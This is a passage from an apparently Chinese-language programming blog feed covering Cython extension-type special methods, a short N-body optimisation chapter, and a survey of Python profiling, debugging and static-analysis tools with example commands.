class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">cdef <span class="class"><span class="keyword">class</span> <span class="title">E</span>:</span></div><div class="line">    <span class="string">"""Extension type that supports addition."""</span></div><div class="line">    cdef int data</div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, d)</span>:</span></div><div class="line">        self.data = d</div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__add__</span><span class="params">(x, y)</span>:</span></div><div class="line">        <span class="comment"># Regular __add__ behavior</span></div><div class="line">        <span class="keyword">if</span> isinstance(x, E):</div><div class="line">            <span class="keyword">if</span> isinstance(y, int):</div><div class="line">                <span class="keyword">return</span> (&lt;E&gt;x).data + y</div><div class="line">        <span class="comment"># __radd__ behavior</span></div><div class="line">        <span class="keyword">elif</span> isinstance(y, E):</div><div class="line">            <span class="keyword">if</span> isinstance(x, int):</div><div class="line">                <span class="keyword">return</span> (&lt;E&gt;y).data + x</div><div class="line">        <span class="keyword">else</span>:</div><div class="line">             <span class="keyword">return</span> <span class="built_in">NotImplemented</span></div></pre></td></tr></table></figure></p><p>Cython不会自动的转换传入<strong>add</strong>中的参数类型，需要检查实例，确保能成功访问每一个E实例对象的data属性。</p><h3 id="丰富的比较操作符"><a href="#丰富的比较操作符" class="headerlink" title="丰富的比较操作符"></a>丰富的比较操作符</h3><p>Cython扩展类型不支持比较操作的特殊方法，如<strong>eq</strong>、<strong>lt</strong>和<strong>le</strong>等特殊方法。但是Cython提供了一个单独的特殊方法<strong>richcmp</strong>(x, y, op)，通过第三个参数来执行要比较的操作。对应关系如下：<br><img src="/2017/08/10/第五章-Cython和扩展类型/1.png" alt="对应关系"></p><p> 表中整数参数是编译时定义在object.h中的常量，我们可以导入这些常量。如下面例子：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">from</span> cpython.object cimport Py_LT, Py_LE, Py_EQ, Py_GE, Py_GT, Py_NE</div><div class="line"></div><div class="line">cdef <span class="class"><span class="keyword">class</span> <span class="title">R</span>:</span></div><div class="line">    <span class="string">"""Extension type that supports rich comparisons."""</span></div><div class="line">    cdef double data</div><div class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, d)</span>:</span></div><div class="line">            self.data = d</div><div class="line">        <span class="function"><span class="keyword">def</span> <span class="title">__richcmp__</span><span class="params">(x, y, int op)</span>:</span></div><div class="line">            cdef:</div><div class="line">                R r</div><div class="line">                double data</div><div class="line">            <span class="comment"># Make r always refer to the R instance.</span></div><div class="line">            r, y = (x, y) <span class="keyword">if</span> isinstance(x, R) <span class="keyword">else</span> (y, x)</div><div class="line">            data = r.data</div><div class="line">            <span class="keyword">if</span> op == Py_LT:</div><div class="line">                <span class="keyword">return</span> data &lt; y</div><div class="line">            <span class="keyword">elif</span> op == Py_LE:</div><div class="line">                <span class="keyword">return</span> data &lt;= y</div><div class="line">            <span class="keyword">elif</span> op == Py_EQ:</div><div class="line">                <span class="keyword">return</span> data == y</div><div class="line">            <span class="keyword">elif</span> op == Py_NE:</div><div class="line">                <span class="keyword">return</span> data != y</div><div class="line">            <span class="keyword">elif</span> op == Py_GT:</div><div class="line">                <span class="keyword">return</span> data &gt; y</div><div class="line">            <span class="keyword">elif</span> op == Py_GE:</div><div class="line">                <span class="keyword">return</span> data &gt;= y</div><div class="line">            <span class="keyword">else</span>:</div><div class="line">                <span class="keyword">assert</span> <span class="keyword">False</span></div></pre></td></tr></table></figure></p><p>效果如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></td><td class="code"><pre><div class="line">In [<span class="number">1</span>]: <span class="keyword">import</span> pyximport; pyximport.install()</div><div class="line">Out[<span class="number">1</span>]: (<span class="keyword">None</span>, &lt;pyximport.pyximport.PyxImporter at <span class="number">0x101c7d290</span>&gt;)</div><div class="line">In [<span class="number">2</span>]: <span class="keyword">from</span> special_methods <span class="keyword">import</span> R</div><div class="line">In [<span class="number">3</span>]: r = R(<span class="number">10</span>)</div><div class="line">In [<span class="number">4</span>]: r &lt; <span class="number">20</span> <span class="keyword">and</span> <span class="number">20</span> &gt; r</div><div class="line">Out[<span class="number">4</span>]: <span class="keyword">True</span></div><div class="line">In [<span class="number">5</span>]: r &gt; <span class="number">20</span> <span class="keyword">and</span> <span class="number">20</span> &lt; r</div><div class="line">Out[<span class="number">5</span>]: <span class="keyword">False</span></div><div class="line">In [<span class="number">6</span>]: <span class="number">0</span> &lt;= r &lt;= <span class="number">100</span></div><div class="line">Out[<span class="number">6</span>]: <span class="keyword">True</span></div><div class="line">In [<span class="number">7</span>]: r == <span class="number">10</span></div><div class="line">Out[<span class="number">7</span>]: <span class="keyword">True</span></div><div class="line">In [<span class="number">8</span>]: r != <span class="number">10</span></div><div class="line">Out[<span class="number">8</span>]: <span class="keyword">False</span></div><div class="line">In [<span class="number">9</span>]: r == <span class="number">20</span></div><div class="line">Out[<span class="number">9</span>]: <span class="keyword">False</span></div><div class="line">In [<span class="number">10</span>]: <span class="number">20</span> == r</div><div class="line">Out[<span class="number">10</span>]: <span class="keyword">False</span></div></pre></td></tr></table></figure></p><h3 id="迭代器支持"><a href="#迭代器支持" class="headerlink" title="迭代器支持"></a>迭代器支持</h3><p>为了让扩展类型可迭代，我们在里面定义了<strong>iter</strong>，就像在纯Python中使用一样，为了让扩展类型成为迭代器，我们在里面定义了<strong>next</strong>特殊方法。例子如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line">cdef <span class="class"><span class="keyword">class</span> <span class="title">I</span>:</span></div><div class="line">    cdef:</div><div class="line">        list data</div><div class="line">        int i</div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self)</span>:</span></div><div class="line">        self.data = range(<span class="number">100</span>)</div><div class="line">        self.i = <span class="number">0</span></div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__iter__</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">return</span> self</div><div class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__next__</span><span class="params">(self)</span>:</span></div><div class="line">        <span class="keyword">if</span> self.i &gt;= len(self.data):</div><div class="line">            <span class="keyword">raise</span> StopIteration()</div><div class="line">        ret = self.data[self.i]</div><div class="line">        self.i += <span class="number">1</span></div><div class="line">        <span class="keyword">return</span> ret</div></pre></td></tr></table></figure></p><p>上面的特殊方法只是列举了一部分，更多的特殊方法吗，请参看Cython的官方文档：<a href="http://docs.cython.org/en/latest/" target="_blank" rel="external">http://docs.cython.org/en/latest/</a></p></the></excerpt>]]></content>
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Cython </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>第四章 Cython实践：N-body模拟</title>
      <link href="/2017/07/31/%E7%AC%AC%E5%9B%9B%E7%AB%A0-Cython%E5%AE%9E%E8%B7%B5%EF%BC%9AN-body%E6%A8%A1%E6%8B%9F/"/>
      <url>/2017/07/31/%E7%AC%AC%E5%9B%9B%E7%AB%A0-Cython%E5%AE%9E%E8%B7%B5%EF%BC%9AN-body%E6%A8%A1%E6%8B%9F/</url>
      <content type="html"><![CDATA[<excerpt in="" index="" |="" 首页摘要=""><p>Cython实践：N-body模拟</p><a id="more"></a><the rest="" of="" contents="" |="" 余下全文=""><p>本章我们将通过N-body模拟代码来更好的理解Cython在实际中的使用。（具体例子省略）</p><p>通过实例我们知道如何将纯Python代码转化为Cython代码进行提速，步骤如下：</p><ul><li>1.测试纯Python代码，定位性能瓶颈代码</li><li>2.重点检查嵌套的for循环、计算密集型操作和嵌套的Python容器，所有的这些操作都很容易通过Cython转化为更加高效的C级别的结构</li><li>3.使用Cython定义C语言数据结构替换Python的数据结构，如果有必要，将Python的数据转化为C语言的数据</li><li>4.重点使用C语言级别的数据结构，从嵌套循环中尽可能的移除Python的数据结构，确保所有使用嵌套循环的变量（包括循环变量本身）都是静态变量</li><li>5.测试代码确保修改不会改变语义，再一次测试性能，如果效果不理想，使用Cython测试工具找出低效的代码</li><li>6.必要时重复上述操作</li></ul><p>记住帕累托原理（80/20法则），我们只需要使用Cython修改20%的代码解决80%的性能问题即可，剩下的80%代码还是Python代码。</p></the></excerpt>]]></content>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> Cython </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Python性能分析与调试</title>
      <link href="/2017/07/31/Python%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90%E4%B8%8E%E8%B0%83%E8%AF%95/"/>
      <url>/2017/07/31/Python%E6%80%A7%E8%83%BD%E5%88%86%E6%9E%90%E4%B8%8E%E8%B0%83%E8%AF%95/</url>
      <content type="html"><![CDATA[<excerpt in="" index="" |="" 首页摘要=""><p>Python性能分析与调试</p><a id="more"></a><the rest="" of="" contents="" |="" 余下全文=""><p>调试能查找并修复软件中的Bug的行为,性能分析,是为软件程序构建一个特殊的配置,并在此基础上收集内存使用情况和时间复杂度星信息。下面我们来看看有那些分析或调试Python的模块或方法：</p><h2 id="Python测试库"><a href="#Python测试库" class="headerlink" title="Python测试库"></a>Python测试库</h2><h3 id="IPython：IPython内建的命令可以对整个-py脚本进行时间和性能测。"><a href="#IPython：IPython内建的命令可以对整个-py脚本进行时间和性能测。" class="headerlink" title="IPython：IPython内建的命令可以对整个.py脚本进行时间和性能测。"></a>IPython：IPython内建的命令可以对整个.py脚本进行时间和性能测。</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">:%timeit   range(<span class="number">45</span>)   <span class="comment">#用timeit分析一小段代码的性能</span></div><div class="line">:%run  test.py         <span class="comment">#查找脚本中的Bug</span></div><div class="line">:%run  -t   test.py    <span class="comment">#对脚本进行时间测试</span></div><div class="line">:%run  -p  test.py    <span class="comment">#对都脚本进行性能测试</span></div><div class="line"></div><div class="line">:%debug        <span class="comment">#如果程序已经崩溃,debug命令会在启动调试器,并在错误所在行自动设置一个断点,然后进入调试模式.</span></div><div class="line">ipdb &gt; list       <span class="comment">#list或者l命令列出代码</span></div><div class="line">ipdb &gt; bt        <span class="comment">#查看调用栈</span></div><div class="line">ipdb &gt; u         <span class="comment">#在调用栈中返回上一级</span></div><div class="line">ipdb &gt; d         <span class="comment">#在调用栈中进入下一级</span></div><div class="line"></div><div class="line"><span class="comment">#除此之外还可以在调试模式中执行任意代码</span></div><div class="line">ipdb &gt; print(a)</div><div class="line"></div><div class="line"><span class="comment">#如果不需要完整的IPython调试器,也可以通过以下方式开启一个IPython</span></div><div class="line"><span class="keyword">import</span>  IPython</div><div class="line">IPython.embed()</div></pre></td></tr></table></figure><h3 id="time：python标准库中自带的模块-简单的计时器。"><a href="#time：python标准库中自带的模块-简单的计时器。" class="headerlink" title="time：python标准库中自带的模块,简单的计时器。"></a>time：python标准库中自带的模块,简单的计时器。</h3><h3 id="timeit：Python标准库中自带的模块-是一个用来测试代码执行时间的模块-容易实现和理解但过于简单。"><a href="#timeit：Python标准库中自带的模块-是一个用来测试代码执行时间的模块-容易实现和理解但过于简单。" class="headerlink" title="timeit：Python标准库中自带的模块,是一个用来测试代码执行时间的模块.容易实现和理解但过于简单。"></a>timeit：Python标准库中自带的模块,是一个用来测试代码执行时间的模块.容易实现和理解但过于简单。</h3><h3 id="pstats：Python标准库中自带的模块-可以使用Stats对象以编程的方式检查分析结果。"><a href="#pstats：Python标准库中自带的模块-可以使用Stats对象以编程的方式检查分析结果。" class="headerlink" title="pstats：Python标准库中自带的模块,可以使用Stats对象以编程的方式检查分析结果。"></a>pstats：Python标准库中自带的模块,可以使用Stats对象以编程的方式检查分析结果。</h3><h3 id="profile：Python标准库中自带的分析模块-使用简单。"><a href="#profile：Python标准库中自带的分析模块-使用简单。" class="headerlink" title="profile：Python标准库中自带的分析模块,使用简单。"></a>profile：Python标准库中自带的分析模块,使用简单。</h3><h3 id="hotshot：Python标准库中自带的分析模块和profile类似-但是用C语言写的-速度更快。"><a href="#hotshot：Python标准库中自带的分析模块和profile类似-但是用C语言写的-速度更快。" class="headerlink" title="hotshot：Python标准库中自带的分析模块和profile类似,但是用C语言写的,速度更快。"></a>hotshot：Python标准库中自带的分析模块和profile类似,但是用C语言写的,速度更快。</h3><h3 id="line-profiler-kernprof：第三方模块line-profiler可以对代码进行分析-有非常直接和详细的报告-能够追踪第三方库里的函数，但-速度慢。"><a href="#line-profiler-kernprof：第三方模块line-profiler可以对代码进行分析-有非常直接和详细的报告-能够追踪第三方库里的函数，但-速度慢。" class="headerlink" title="line_profiler/kernprof：第三方模块line_profiler可以对代码进行分析.有非常直接和详细的报告,能够追踪第三方库里的函数，但 速度慢。"></a>line_profiler/kernprof：第三方模块line_profiler可以对代码进行分析.有非常直接和详细的报告,能够追踪第三方库里的函数，但 速度慢。</h3><h3 id="cProfile：cProfile是从Python2-5版本开始引入的c语言扩展模块-该模块可以用来进行确定性能分析-速度快-但是信息相对有限-需要进一步调试。"><a href="#cProfile：cProfile是从Python2-5版本开始引入的c语言扩展模块-该模块可以用来进行确定性能分析-速度快-但是信息相对有限-需要进一步调试。" class="headerlink" title="cProfile：cProfile是从Python2.5版本开始引入的c语言扩展模块,该模块可以用来进行确定性能分析.速度快,但是信息相对有限,需要进一步调试。"></a>cProfile：cProfile是从Python2.5版本开始引入的c语言扩展模块,该模块可以用来进行确定性能分析.速度快,但是信息相对有限,需要进一步调试。</h3><h3 id="runsnake-：runsnake-是一个可视化工具，用于显示cProfile-创建的统计文件—你只需要看它生成的图像就可以快速意识到哪个函数开销最大。"><a href="#runsnake-：runsnake-是一个可视化工具，用于显示cProfile-创建的统计文件—你只需要看它生成的图像就可以快速意识到哪个函数开销最大。" class="headerlink" title="runsnake ：runsnake 是一个可视化工具，用于显示cProfile 创建的统计文件—你只需要看它生成的图像就可以快速意识到哪个函数开销最大。"></a>runsnake ：runsnake 是一个可视化工具，用于显示cProfile 创建的统计文件—你只需要看它生成的图像就可以快速意识到哪个函数开销最大。</h3><h3 id="memory-profiler：一个不错的内存分析器。"><a href="#memory-profiler：一个不错的内存分析器。" class="headerlink" title="memory_profiler：一个不错的内存分析器。"></a>memory_profiler：一个不错的内存分析器。</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#安装</span></div><div class="line">$ sudo  easy_install  memory_profiler</div><div class="line"></div><div class="line"><span class="comment">#改善memory_profiler的性能</span></div><div class="line">$ sudo  easy_install  psutil</div><div class="line"></div><div class="line"><span class="comment">#分析代码</span></div><div class="line">$ python  -m  memory_profiler  test.py</div></pre></td></tr></table></figure><h3 id="profilehooks：用于分析函数的装饰器集合。"><a href="#profilehooks：用于分析函数的装饰器集合。" class="headerlink" title="profilehooks：用于分析函数的装饰器集合。"></a>profilehooks：用于分析函数的装饰器集合。</h3><h3 id="objgraph：检查内存泄漏-快速生成对象图。"><a href="#objgraph：检查内存泄漏-快速生成对象图。" class="headerlink" title="objgraph：检查内存泄漏,快速生成对象图。"></a>objgraph：检查内存泄漏,快速生成对象图。</h3><h3 id="pytracemalloc：很好用的内存分析第三方模块-开销小-输出详细。"><a href="#pytracemalloc：很好用的内存分析第三方模块-开销小-输出详细。" class="headerlink" title="pytracemalloc：很好用的内存分析第三方模块,开销小,输出详细。"></a>pytracemalloc：很好用的内存分析第三方模块,开销小,输出详细。</h3><h3 id="Guppy：该项目有一个内存堆的调查工具叫作heapy，可以让你查看Python-堆中对象的数量以及每个对象的大小。"><a href="#Guppy：该项目有一个内存堆的调查工具叫作heapy，可以让你查看Python-堆中对象的数量以及每个对象的大小。" class="headerlink" title="Guppy：该项目有一个内存堆的调查工具叫作heapy，可以让你查看Python 堆中对象的数量以及每个对象的大小。"></a>Guppy：该项目有一个内存堆的调查工具叫作heapy，可以让你查看Python 堆中对象的数量以及每个对象的大小。</h3><h3 id="dowser-：dowser-可以在代码运行时钩入名字空间并通过CherryPy-接口在一个Web-服务器上提供一个实时的变量实例图。每个被追踪对象都有一个走势图，让你可以看到某个对象的数量是否在增长。这在分析长期运行的进程时很有用。"><a href="#dowser-：dowser-可以在代码运行时钩入名字空间并通过CherryPy-接口在一个Web-服务器上提供一个实时的变量实例图。每个被追踪对象都有一个走势图，让你可以看到某个对象的数量是否在增长。这在分析长期运行的进程时很有用。" class="headerlink" title="dowser ：dowser 可以在代码运行时钩入名字空间并通过CherryPy 接口在一个Web 服务器上提供一个实时的变量实例图。每个被追踪对象都有一个走势图，让你可以看到某个对象的数量是否在增长。这在分析长期运行的进程时很有用。"></a>dowser ：dowser 可以在代码运行时钩入名字空间并通过CherryPy 接口在一个Web 服务器上提供一个实时的变量实例图。每个被追踪对象都有一个走势图，让你可以看到某个对象的数量是否在增长。这在分析长期运行的进程时很有用。</h3><h3 id="trace：Python标准库中自带的追踪模块。"><a href="#trace：Python标准库中自带的追踪模块。" class="headerlink" title="trace：Python标准库中自带的追踪模块。"></a>trace：Python标准库中自带的追踪模块。</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#使用</span></div><div class="line">$ python  -mtrace  trace  bug.py</div></pre></td></tr></table></figure><h3 id="faulthandler：Python3标准库中自带的模块-用来显示发生段错误的原因。"><a href="#faulthandler：Python3标准库中自带的模块-用来显示发生段错误的原因。" class="headerlink" title="faulthandler：Python3标准库中自带的模块,用来显示发生段错误的原因。"></a>faulthandler：Python3标准库中自带的模块,用来显示发生段错误的原因。</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#使用</span></div><div class="line"><span class="keyword">import</span>  faulthandler</div><div class="line">faulthandler.enable()</div></pre></td></tr></table></figure><h3 id="pdb：Python标准库中自带的调试模块。"><a href="#pdb：Python标准库中自带的调试模块。" class="headerlink" title="pdb：Python标准库中自带的调试模块。"></a>pdb：Python标准库中自带的调试模块。</h3><p>pdb的直接替代者ipdb和pudb,都可通过$ sudo  easy_install  安装<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#开启调试器</span></div><div class="line"><span class="keyword">import</span>  pdb</div><div class="line">pdb.set_trace()</div><div class="line"></div><div class="line"><span class="comment">#或者</span></div><div class="line">$  python  -mpdb   bug.py</div></pre></td></tr></table></figure></p><h3 id="pudb：pudb是一个基于控制台的Python调试器-安装简单-且支持可视化全屏操作-支持方向键和Vi命令-也能在需要的时候与IPython集成。"><a href="#pudb：pudb是一个基于控制台的Python调试器-安装简单-且支持可视化全屏操作-支持方向键和Vi命令-也能在需要的时候与IPython集成。" class="headerlink" title="pudb：pudb是一个基于控制台的Python调试器,安装简单,且支持可视化全屏操作,支持方向键和Vi命令,也能在需要的时候与IPython集成。"></a>pudb：pudb是一个基于控制台的Python调试器,安装简单,且支持可视化全屏操作,支持方向键和Vi命令,也能在需要的时候与IPython集成。</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#安装</span></div><div class="line">$sudo easy_install pudb</div><div class="line"></div><div class="line"><span class="comment">#启动调试器</span></div><div class="line">$python -m pudb bug.py</div><div class="line"></div><div class="line"><span class="comment">#或者</span></div><div class="line">$pudb  bug.py</div></pre></td></tr></table></figure><p><img src="/2017/07/31/Python性能分析与调试/1.png" alt="pudb"><br>用户界面的上方是最重要的调试命令,还能在界面中看到被调试的代码,变量,栈和已定义的断点,键q可以退出大多数的菜单,键n可以使调试器移到下一行,也可以用方向键或者vi编辑器风格的j键和k键,把光标移动到适当位置并执行特定的操作,通过键b设置断点。</p><h3 id="Pyflakes：Pylakes是一个代码分析包-可以用来分析代码-并发现各种潜在的问题-例如-引入但没有用到的模块-没有用到的变量。"><a href="#Pyflakes：Pylakes是一个代码分析包-可以用来分析代码-并发现各种潜在的问题-例如-引入但没有用到的模块-没有用到的变量。" class="headerlink" title="Pyflakes：Pylakes是一个代码分析包,可以用来分析代码,并发现各种潜在的问题,例如:引入但没有用到的模块,没有用到的变量。"></a>Pyflakes：Pylakes是一个代码分析包,可以用来分析代码,并发现各种潜在的问题,例如:引入但没有用到的模块,没有用到的变量。</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#安装</span></div><div class="line">$sudo easy_install pyflakes</div><div class="line"></div><div class="line"><span class="comment">#分析代码</span></div><div class="line">$pyflakes   bug.py</div></pre></td></tr></table></figure><h3 id="Pylint：Pylint是另外一个开源的静态代码分析器-比Pyflakes复杂-且允许用户做更多的事-但分析速度比Pyflakes慢。"><a href="#Pylint：Pylint是另外一个开源的静态代码分析器-比Pyflakes复杂-且允许用户做更多的事-但分析速度比Pyflakes慢。" class="headerlink" title="Pylint：Pylint是另外一个开源的静态代码分析器,比Pyflakes复杂,且允许用户做更多的事,但分析速度比Pyflakes慢。"></a>Pylint：Pylint是另外一个开源的静态代码分析器,比Pyflakes复杂,且允许用户做更多的事,但分析速度比Pyflakes慢。</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#安装</span></div><div class="line">$sudo  easy_install  pylint</div><div class="line"></div><div class="line"><span class="comment">#分析代码</span></div><div class="line">$pylint  bug.py</div></pre></td></tr></table></figure><p>Pylint默认输出纯文本的分析结果,但如果有需要可以指定其输出HTML格式的信息.消息类型有以下几种：</p><ul><li>[R]：重构类型,建议进行重构</li><li>[C]：惯例类型,违反了代码风格</li><li>[W]：警告类型,针对小问题的警告信息</li><li>[E]：错误类型,错误或者潜在的bug </li><li>[F]+致命错误类型,发生了致命错误,因此不能进行进一步的分析</li></ul><h3 id="Pychecker：一个老牌的静态分析工具-开发状态已经不太活跃-Pychecker试图引入每一个模块-并对其进行处理-通过代码分析-可以发现各种问题。"><a href="#Pychecker：一个老牌的静态分析工具-开发状态已经不太活跃-Pychecker试图引入每一个模块-并对其进行处理-通过代码分析-可以发现各种问题。" class="headerlink" title="Pychecker：一个老牌的静态分析工具,开发状态已经不太活跃,Pychecker试图引入每一个模块,并对其进行处理,通过代码分析,可以发现各种问题。"></a>Pychecker：一个老牌的静态分析工具,开发状态已经不太活跃,Pychecker试图引入每一个模块,并对其进行处理,通过代码分析,可以发现各种问题。</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#安装：下载源代码编译安装</span></div><div class="line"></div><div class="line"><span class="comment">#分析代码</span></div><div class="line">$ pychecker  bug.py</div></pre></td></tr></table></figure><h3 id="docstrings-doctest-：docstrings是嵌入在代码中的字符串-其内容看上去有点像交互式的会话-这些字符串可用来检验某些假设-或者仅仅把他们看作是一些规范代码-需要用doctest模块运行这些测试。"><a href="#docstrings-doctest-：docstrings是嵌入在代码中的字符串-其内容看上去有点像交互式的会话-这些字符串可用来检验某些假设-或者仅仅把他们看作是一些规范代码-需要用doctest模块运行这些测试。" class="headerlink" title="docstrings ( doctest ) ：docstrings是嵌入在代码中的字符串,其内容看上去有点像交互式的会话,这些字符串可用来检验某些假设,或者仅仅把他们看作是一些规范代码,需要用doctest模块运行这些测试。"></a>docstrings ( doctest ) ：docstrings是嵌入在代码中的字符串,其内容看上去有点像交互式的会话,这些字符串可用来检验某些假设,或者仅仅把他们看作是一些规范代码,需要用doctest模块运行这些测试。</h3><h3 id="unittest：doctest模块简单易用-unittest-基于Java的流行测试框架JUnit-则更灵活和强大-unittest模块会区分由异引发的错误和调用函数而导致的失败。"><a href="#unittest：doctest模块简单易用-unittest-基于Java的流行测试框架JUnit-则更灵活和强大-unittest模块会区分由异引发的错误和调用函数而导致的失败。" class="headerlink" title="unittest：doctest模块简单易用,unittest(基于Java的流行测试框架JUnit)则更灵活和强大.unittest模块会区分由异引发的错误和调用函数而导致的失败。"></a>unittest：doctest模块简单易用,unittest(基于Java的流行测试框架JUnit)则更灵活和强大.unittest模块会区分由异引发的错误和调用函数而导致的失败。</h3><h3 id="mock：模拟对象-mock-是真实对象的替代物-用来测试真实对象的部分行为-创建一个模拟对象并用它来测试一段代码。"><a href="#mock：模拟对象-mock-是真实对象的替代物-用来测试真实对象的部分行为-创建一个模拟对象并用它来测试一段代码。" class="headerlink" title="mock：模拟对象(mock)是真实对象的替代物,用来测试真实对象的部分行为.创建一个模拟对象并用它来测试一段代码。"></a>mock：模拟对象(mock)是真实对象的替代物,用来测试真实对象的部分行为.创建一个模拟对象并用它来测试一段代码。</h3><h3 id="lettuce：基于BDD-行为驱动开发-方式的测试-BDD方式背后隐藏的想法是-让不会编程的人-能够以某种方式-编写测试-代码的主体部分-Lettuce框架就是基于BDD的测试框架。"><a href="#lettuce：基于BDD-行为驱动开发-方式的测试-BDD方式背后隐藏的想法是-让不会编程的人-能够以某种方式-编写测试-代码的主体部分-Lettuce框架就是基于BDD的测试框架。" class="headerlink" title="lettuce：基于BDD(行为驱动开发)方式的测试,BDD方式背后隐藏的想法是,让不会编程的人,能够以某种方式,编写测试 代码的主体部分.Lettuce框架就是基于BDD的测试框架。"></a>lettuce：基于BDD(行为驱动开发)方式的测试,BDD方式背后隐藏的想法是,让不会编程的人,能够以某种方式,编写测试 代码的主体部分.Lettuce框架就是基于BDD的测试框架。</h3><p>测试方式 ：首先在tests目录中建立一个features目录,在features目录中,要包含一个factorial.feature文件和一个steps.py文件,steps.py文件的内容是功能描述和测试代码.执行测试时,首先进入tests目录,然后键入命令$lettuce。</p><hr><h2 id="标准的Linux测试工具："><a href="#标准的Linux测试工具：" class="headerlink" title="标准的Linux测试工具："></a>标准的Linux测试工具：</h2><h3 id="time：简单的代码运行时间测试工具。"><a href="#time：简单的代码运行时间测试工具。" class="headerlink" title="time：简单的代码运行时间测试工具。"></a>time：简单的代码运行时间测试工具。</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#使用方式</span></div><div class="line">$  time  python  test.py</div></pre></td></tr></table></figure><p>三个输出变量分别代表：</p><ul><li>real：表示实际的程序运行时间</li><li>user：表示在用户态的CPU总时间</li><li>sys：表示在内核态的CPU总时间</li></ul><h3 id="strace：用来追踪fork-出来的子进程。"><a href="#strace：用来追踪fork-出来的子进程。" class="headerlink" title="strace：用来追踪fork()出来的子进程。"></a>strace：用来追踪fork()出来的子进程。</h3><h3 id="ltrace：与trace类似-不同的是它输出的是库函数的调用。"><a href="#ltrace：与trace类似-不同的是它输出的是库函数的调用。" class="headerlink" title="ltrace：与trace类似,不同的是它输出的是库函数的调用。"></a>ltrace：与trace类似,不同的是它输出的是库函数的调用。</h3><h3 id="lsof：lsof可以用来指出你在ltrace-strace中看到的句柄数值的意义。"><a href="#lsof：lsof可以用来指出你在ltrace-strace中看到的句柄数值的意义。" class="headerlink" title="lsof：lsof可以用来指出你在ltrace/strace中看到的句柄数值的意义。"></a>lsof：lsof可以用来指出你在ltrace/strace中看到的句柄数值的意义。</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#使用方式</span></div><div class="line">$ lsof  -p <span class="number">1234</span></div></pre></td></tr></table></figure><h3 id="top-htop：进程查看-htop更详细。"><a href="#top-htop：进程查看-htop更详细。" class="headerlink" title="top/htop：进程查看,htop更详细。"></a>top/htop：进程查看,htop更详细。</h3><h3 id="dstat：服务器监控。"><a href="#dstat：服务器监控。" class="headerlink" 